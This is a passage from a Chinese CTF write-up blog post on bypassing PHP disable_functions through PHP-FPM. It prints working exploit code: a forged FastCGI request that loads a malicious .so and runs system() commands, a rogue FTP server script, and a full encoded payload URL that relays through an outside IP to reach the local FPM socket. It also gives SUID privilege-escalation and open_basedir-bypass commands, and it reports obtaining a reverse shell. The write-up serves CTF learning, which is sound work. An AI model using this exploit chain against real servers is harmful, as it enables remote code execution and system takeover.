class="hljs-string">&#x27;reserved&#x27;</span>]      = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-number">7</span>&#125;);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Read a FastCGI Packet</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPacket</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$packet</span> = fread(<span class="hljs-keyword">$this</span>-&gt;_sock, <span class="hljs-built_in">self</span>::HEADER_LEN)) &#123;<br>            <span class="hljs-variable">$resp</span> = <span class="hljs-keyword">$this</span>-&gt;decodePacketHeader(<span class="hljs-variable">$packet</span>);<br>            <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$len</span>  = <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;contentLength&#x27;</span>];<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$len</span> &amp;&amp; <span class="hljs-variable">$buf</span>=fread(<span class="hljs-keyword">$this</span>-&gt;_sock, <span class="hljs-variable">$len</span>)) &#123;<br>                    <span class="hljs-variable">$len</span> -= strlen(<span class="hljs-variable">$buf</span>);<br>                    <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>] .= <span class="hljs-variable">$buf</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]) &#123;<br>                <span class="hljs-variable">$buf</span>=fread(<span class="hljs-keyword">$this</span>-&gt;_sock, <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$resp</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Get Informations on the FastCGI application</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $requestedInfo information to retrieve</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> array</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getValues</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$requestedInfo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;connect();<br>        <span class="hljs-variable">$request</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$requestedInfo</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$info</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair(<span class="hljs-variable">$info</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>        &#125;<br>        fwrite(<span class="hljs-keyword">$this</span>-&gt;_sock, <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::GET_VALUES, <span class="hljs-variable">$request</span>, <span class="hljs-number">0</span>));<br>        <span class="hljs-variable">$resp</span> = <span class="hljs-keyword">$this</span>-&gt;readPacket();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-built_in">self</span>::GET_VALUES_RESULT) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;readNvpair(<span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;content&#x27;</span>], <span class="hljs-variable">$resp</span>[<span class="hljs-string">&#x27;length&#x27;</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Execute a request to the FastCGI application</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> array $params Array of parameters</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> String $stdin Content</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> String</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">request</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$params</span>, <span class="hljs-variable">$stdin</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-comment">//        $this-&gt;connect();</span><br>        <span class="hljs-variable">$request</span> = <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::BEGIN_REQUEST, chr(<span class="hljs-number">0</span>) . chr(<span class="hljs-built_in">self</span>::RESPONDER) . chr((<span class="hljs-keyword">int</span>) <span class="hljs-keyword">$this</span>-&gt;_keepAlive) . str_repeat(chr(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>));<br>        <span class="hljs-variable">$paramsRequest</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-variable">$paramsRequest</span> .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$paramsRequest</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-variable">$paramsRequest</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stdin</span>) &#123;<br>            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-variable">$stdin</span>);<br>        &#125;<br>        <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-string">&#x27;&#x27;</span>);<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;data=&#x27;</span>.urlencode(<span class="hljs-variable">$request</span>));<br><span class="hljs-comment">//        fwrite($this-&gt;_sock, $request);</span><br><span class="hljs-comment">//        do &#123;</span><br><span class="hljs-comment">//            $resp = $this-&gt;readPacket();</span><br><span class="hljs-comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span><br><span class="hljs-comment">//                $response .= $resp[&#x27;content&#x27;];</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span><br><span class="hljs-comment">//        var_dump($resp);</span><br><span class="hljs-comment">//        if (!is_array($resp)) &#123;</span><br><span class="hljs-comment">//            throw new Exception(&#x27;Bad request&#x27;);</span><br><span class="hljs-comment">//        &#125;</span><br><span class="hljs-comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span><br><span class="hljs-comment">//            case self::CANT_MPX_CONN:</span><br><span class="hljs-comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span><br><span class="hljs-comment">//                break;</span><br><span class="hljs-comment">//            case self::OVERLOADED:</span><br><span class="hljs-comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span><br><span class="hljs-comment">//                break;</span><br><span class="hljs-comment">//            case self::UNKNOWN_ROLE:</span><br><span class="hljs-comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span><br><span class="hljs-comment">//                break;</span><br><span class="hljs-comment">//            case self::REQUEST_COMPLETE:</span><br><span class="hljs-comment">//                return $response;</span><br><span class="hljs-comment">//        &#125;</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// real exploit start here</span><br><span class="hljs-comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="hljs-comment">//    die(&quot;Check your input\n&quot;);</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span><br><span class="hljs-comment">//    $filepath = __FILE__;</span><br><span class="hljs-comment">//&#125;else&#123;</span><br><span class="hljs-comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-variable">$filepath</span> = <span class="hljs-string">&quot;/var/www/html/add_api.php&quot;</span>;    <span class="hljs-comment">// 目标主机已知的PHP文件的路径</span><br><span class="hljs-variable">$req</span> = <span class="hljs-string">&#x27;/&#x27;</span>.basename(<span class="hljs-variable">$filepath</span>);<br><span class="hljs-variable">$uri</span> = <span class="hljs-variable">$req</span> .<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-string">&#x27;command=whoami&#x27;</span>;    <span class="hljs-comment">// 啥也不是, 不用管</span><br><span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> FCGIClient(<span class="hljs-string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, <span class="hljs-number">-1</span>);<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>;    <span class="hljs-comment">// 啥也不是, 不用管</span><br><span class="hljs-variable">$php_value</span> = <span class="hljs-string">&quot;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>;<br><span class="hljs-variable">$params</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="hljs-variable">$filepath</span>,<br>    <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="hljs-variable">$req</span>,<br>    <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="hljs-string">&#x27;command=whoami&#x27;</span>,<br>    <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="hljs-variable">$uri</span>,<br>    <span class="hljs-string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="hljs-variable">$req</span>,<br><span class="hljs-comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span><br>    <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="hljs-variable">$php_value</span>,<br>    <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="hljs-string">&#x27;80sec/wofeiwo&#x27;</span>,<br>    <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;9001&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="hljs-string">&#x27;80&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; strlen(<span class="hljs-variable">$code</span>)<br>);<br><span class="hljs-comment">// print_r($_REQUEST);</span><br><span class="hljs-comment">// print_r($params);</span><br><span class="hljs-comment">//echo &quot;Call: $uri\n\n&quot;;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$client</span>-&gt;request(<span class="hljs-variable">$params</span>, <span class="hljs-variable">$code</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>得到payload</p>
+<p><a href="https://imgtu.com/i/2BW0vd"><img src="https://z3.ax1x.com/2021/06/08/2BW0vd.png" srcset="/img/loading.gif" lazyload alt="2BW0vd.png"></a></p>
+<p>在vps上搭建恶意ftp服务端，主要负责转发数据到9001端口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <br>s.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">23</span>))<br>s.listen(<span class="hljs-number">1</span>)<br>conn, addr = s.accept()<br>conn.send(<span class="hljs-string">b&#x27;220 welcome\n&#x27;</span>)<br><span class="hljs-comment">#Service ready for new user.</span><br><span class="hljs-comment">#Client send anonymous username</span><br><span class="hljs-comment">#USER anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;331 Please specify the password.\n&#x27;</span>)<br><span class="hljs-comment">#User name okay, need password.</span><br><span class="hljs-comment">#Client send anonymous password.</span><br><span class="hljs-comment">#PASS anonymous</span><br>conn.send(<span class="hljs-string">b&#x27;230 Login successful.\n&#x27;</span>)<br><span class="hljs-comment">#User logged in, proceed. Logged out if appropriate.</span><br><span class="hljs-comment">#TYPE I</span><br>conn.send(<span class="hljs-string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)<br><span class="hljs-comment">#Size /</span><br>conn.send(<span class="hljs-string">b&#x27;550 Could not get the file size.\n&#x27;</span>)<br><span class="hljs-comment">#EPSV (1)</span><br>conn.send(<span class="hljs-string">b&#x27;150 ok\n&#x27;</span>)<br><span class="hljs-comment">#PASV</span><br>conn.send(<span class="hljs-string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="hljs-comment">#STOR / (2)</span><br>conn.send(<span class="hljs-string">b&#x27;150 Permission denied.\n&#x27;</span>)<br><span class="hljs-comment">#QUIT</span><br>conn.send(<span class="hljs-string">b&#x27;221 Goodbye.\n&#x27;</span>)<br>conn.close()<br></code></pre></td></tr></table></figure>
+
+
+
+<p>在vps上开启ftp服务</p>
+<p><a href="https://imgtu.com/i/2BWwgH"><img src="https://z3.ax1x.com/2021/06/08/2BWwgH.png" srcset="/img/loading.gif" lazyload alt="2BWwgH.png"></a></p>
+<p>发送payload</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">/add_api.php?backdoor=<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];file_put_contents(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$data</span>);&amp;file=ftp://aaa@<span class="hljs-number">103.52</span>.<span class="hljs-number">155.49</span>:<span class="hljs-number">23</span>/<span class="hljs-number">123</span>&amp;data=<span class="hljs-meta">%01</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%08</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%04</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%02</span><span class="hljs-meta">%3F</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%11</span><span class="hljs-meta">%0BGATEWAY_INTERFACEFastCGI</span><span class="hljs-meta">%2F1</span>.<span class="hljs-number">0</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%04REQUEST_METHODPOST</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%19SCRIPT_FILENAME</span><span class="hljs-meta">%2Fvar</span><span class="hljs-meta">%2Fwww</span><span class="hljs-meta">%2Fhtml</span><span class="hljs-meta">%2Fadd_api</span>.php<span class="hljs-meta">%0B</span><span class="hljs-meta">%0CSCRIPT_NAME</span><span class="hljs-meta">%2Fadd_api</span>.php<span class="hljs-meta">%0C</span><span class="hljs-meta">%0EQUERY_STRINGcommand</span><span class="hljs-meta">%3Dwhoami</span><span class="hljs-meta">%0B</span><span class="hljs-meta">%1BREQUEST_URI</span><span class="hljs-meta">%2Fadd_api</span>.php<span class="hljs-meta">%3Fcommand</span><span class="hljs-meta">%3Dwhoami</span><span class="hljs-meta">%0C</span><span class="hljs-meta">%0CDOCUMENT_URI</span><span class="hljs-meta">%2Fadd_api</span>.php<span class="hljs-meta">%09</span><span class="hljs-meta">%80</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%B3PHP_VALUEunserialize_callback_func</span>+<span class="hljs-meta">%3D</span>+system<span class="hljs-meta">%0Aextension_dir</span>+<span class="hljs-meta">%3D</span>+<span class="hljs-meta">%2Ftmp</span><span class="hljs-meta">%0Aextension</span>+<span class="hljs-meta">%3D</span>+hpdoger.so<span class="hljs-meta">%0Adisable_classes</span>+<span class="hljs-meta">%3D</span>+<span class="hljs-meta">%0Adisable_functions</span>+<span class="hljs-meta">%3D</span>+<span class="hljs-meta">%0Aallow_url_include</span>+<span class="hljs-meta">%3D</span>+On<span class="hljs-meta">%0Aopen_basedir</span>+<span class="hljs-meta">%3D</span>+<span class="hljs-meta">%2F</span><span class="hljs-meta">%0Aauto_prepend_file</span>+<span class="hljs-meta">%3D</span>+<span class="hljs-meta">%0F</span><span class="hljs-meta">%0DSERVER_SOFTWARE80sec</span><span class="hljs-meta">%2Fwofeiwo</span><span class="hljs-meta">%0B</span><span class="hljs-meta">%09REMOTE_ADDR127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><span class="hljs-meta">%0B</span><span class="hljs-meta">%04REMOTE_PORT9001</span><span class="hljs-meta">%0B</span><span class="hljs-meta">%09SERVER_ADDR127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><span class="hljs-meta">%0B</span><span class="hljs-meta">%02SERVER_PORT80</span><span class="hljs-meta">%0B</span><span class="hljs-meta">%09SERVER_NAMElocalhost</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%08SERVER_PROTOCOLHTTP</span><span class="hljs-meta">%2F1</span>.<span class="hljs-number">1</span><span class="hljs-meta">%0E</span><span class="hljs-meta">%02CONTENT_LENGTH49</span><span class="hljs-meta">%01</span><span class="hljs-meta">%04</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%05</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%001</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%3Fphp</span>+system<span class="hljs-meta">%28</span><span class="hljs-meta">%24_REQUEST</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%27command</span><span class="hljs-meta">%27</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%29</span><span class="hljs-meta">%3B</span>+phpinfo<span class="hljs-meta">%28</span><span class="hljs-meta">%29</span><span class="hljs-meta">%3B</span>+<span class="hljs-meta">%3F</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%01</span><span class="hljs-meta">%05</span><span class="hljs-meta">%00</span><span class="hljs-meta">%01</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><span class="hljs-meta">%00</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>反弹shell成功</p>
+<p><a href="https://imgtu.com/i/2BWDKA"><img src="https://z3.ax1x.com/2021/06/08/2BWDKA.png" srcset="/img/loading.gif" lazyload alt="2BWDKA.png"></a>直接cat /flag，发现权限不够，进一步提升权限，利用suid提权</p>
+<p><a href="https://imgtu.com/i/2BWrDI"><img src="https://z3.ax1x.com/2021/06/08/2BWrDI.png" srcset="/img/loading.gif" lazyload alt="2BWrDI.png"></a></p>
+<p>发现php有suid权限</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/2BWsbt"><img src="https://z3.ax1x.com/2021/06/08/2BWsbt.png" srcset="/img/loading.gif" lazyload alt="2BWsbt.png"></a></p>
+<p>php -a进入交互模式，读取flag</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">mkdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-selector-tag">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-selector-tag">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-selector-tag">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-selector-tag">echo</span> <span class="hljs-selector-tag">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/2BW6VP"><img src="https://z3.ax1x.com/2021/06/08/2BW6VP.png" srcset="/img/loading.gif" lazyload alt="2BW6VP.png"></a></p>
+<h2 id="另一种方法：利用蚁剑插件"><a href="#另一种方法：利用蚁剑插件" class="headerlink" title="另一种方法：利用蚁剑插件"></a>另一种方法：利用蚁剑插件</h2><p>参考这位师傅的文章修改一下插件的配置，这里就不复现了</p>
+<p><a href="https://whoamianony.top/2021/05/03/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/[2021%20%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B]one_Pointer_php/">https://whoamianony.top/2021/05/03/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/[2021%20%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B]one_Pointer_php/</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>相关知识点</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-number">1.</span>两种open_basedir绕过方法：利用<span class="hljs-attr">glob:</span><span class="hljs-comment">//、利用chdir()和ini_set()2.利用PHP-FPM绕过disable_function利用FTP转发：设置file_put_contetns的第二个参数为伪造的FastCGI协议，包含上传的恶意so文件，file_put_contents使用ftp协议时把第二个参数发给设置好的127.0.0.1:9001，实现加载恶意so文件3.suid提权</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>学到了不少东西</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.guildhab.top/2019/10/php-fpm-%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://www.guildhab.top/2019/10/php-fpm-%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+<p><a href="https://whoamianony.top/2021/05/03/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/[2021%20%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B]one_Pointer_php/">https://whoamianony.top/2021/05/03/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/[2021%20%E2%80%9C%E8%93%9D%E5%B8%BD%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B]one_Pointer_php/</a></p>
+<p><a href="https://bbs.pediy.com/thread-267517.htm">https://bbs.pediy.com/thread-267517.htm</a></p>
+<p><a href="https://www.anquanke.com/post/id/193117#h2-1">https://www.anquanke.com/post/id/193117#h2-1</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/08/PHP/">
+                        <span class="hidden-mobile">PHP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
